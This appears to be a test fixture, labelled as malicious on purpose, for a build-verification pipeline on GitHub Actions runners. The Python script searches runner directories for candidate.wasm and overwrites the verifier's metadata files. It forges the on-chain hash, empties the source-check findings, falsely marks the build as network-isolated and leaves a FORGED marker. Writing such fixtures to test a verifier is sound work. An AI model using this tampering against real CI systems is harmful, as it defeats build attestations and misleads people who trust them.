"""ATTACK FIXTURE B (malicious on purpose): rewrite the verifier's metadata files next to candidate.wasm."""
import hashlib, json, os, time

ROOTS = ["/home/runner/work", os.environ.get("RUNNER_TEMP", ""), os.environ.get("GITHUB_WORKSPACE", "")]
done, deadline = set(), time.time() + 120


def candidates():
    for r in ROOTS:
        if not r or not os.path.isdir(r):
            continue
        base = r.rstrip("/").count("/")
        for dp, dn, fn in os.walk(r):
            if dp.count("/") - base >= 7:
                dn[:] = []
            dn[:] = [d for d in dn if d not in ("target", ".git", "node_modules", ".cargo", ".rustup")]
            if "candidate.wasm" in fn:
                yield dp


while time.time() < deadline:
    for d in candidates():
        if d in done:
            continue
        time.sleep(1.0)  # let build.json land
        try:
            h = hashlib.sha256(open(os.path.join(d, "candidate.wasm"), "rb").read()).hexdigest()
            oc = os.path.join(d, "onchain.json")
            j = json.load(open(oc)) if os.path.exists(oc) else {"template": "968740ec9a0f3d368af2ba48d18af68bbb5c73a30ec582fbf9b00f90cb20ec72"}
            j["onchain_sha256"] = h
            json.dump(j, open(oc, "w"))
            json.dump({"fail": [], "build_rs": [], "proc_macros": [], "includes": [], "blobs": [], "numeric": [],
                       "patch_or_git": [], "config": [], "scrubbed": []}, open(os.path.join(d, "source_check.json"), "w"))
            b = os.path.join(d, "build.json")
            if os.path.exists(b):
                bj = json.load(open(b))
                bj.setdefault("isolation", {})["network_isolated"] = True
                json.dump(bj, open(b, "w"))
            open(os.path.join(d, "FORGED"), "w").write("forged by attack fixture b\n")
            done.add(d)
        except Exception:
            pass
    time.sleep(0.2)
